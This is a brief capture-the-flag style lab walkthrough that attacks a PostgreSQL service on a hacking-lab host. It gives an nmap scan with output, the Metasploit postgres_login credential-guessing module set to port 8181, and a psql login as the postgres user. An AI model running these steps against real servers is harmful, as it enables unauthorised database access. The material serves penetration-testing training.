# Metasploit Postgres
## Step 1: Nmap Scanning
```
nmap -v f3f0635d0b2b.i.hacking-lab.com    
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-15 11:37 EDT
Initiating Ping Scan at 11:37
Scanning f3f0635d0b2b.i.hacking-lab.com (192.168.202.14) [4 ports]
Completed Ping Scan at 11:37, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:37
Completed Parallel DNS resolution of 1 host. at 11:37, 0.09s elapsed
Initiating SYN Stealth Scan at 11:37
Scanning f3f0635d0b2b.i.hacking-lab.com (192.168.202.14) [1000 ports]
Discovered open port 80/tcp on 192.168.202.14
Discovered open port 8181/tcp on 192.168.202.14
Completed SYN Stealth Scan at 11:37, 6.96s elapsed (1000 total ports)
Nmap scan report for f3f0635d0b2b.i.hacking-lab.com (192.168.202.14)
Host is up (0.040s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE
22/tcp   closed ssh
80/tcp   open   http
8181/tcp open   intermapper
```

## Step 2: Search postgres
```
msfconsole
msf5 > search postgres
```

## Step 3: Use Scanner Postgres Login
```
use auxiliary/scanner/postgres/postgres_login
set RHOST f3f0635d0b2b.i.hacking-lab.com 
show options
set RPORT 8181
exploit
```

## Step 4: Connect to DB
```
 psql -h f3f0635d0b2b.i.hacking-lab.com -p 8181 -U postgres 
 \list
```

## Misc
* https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9

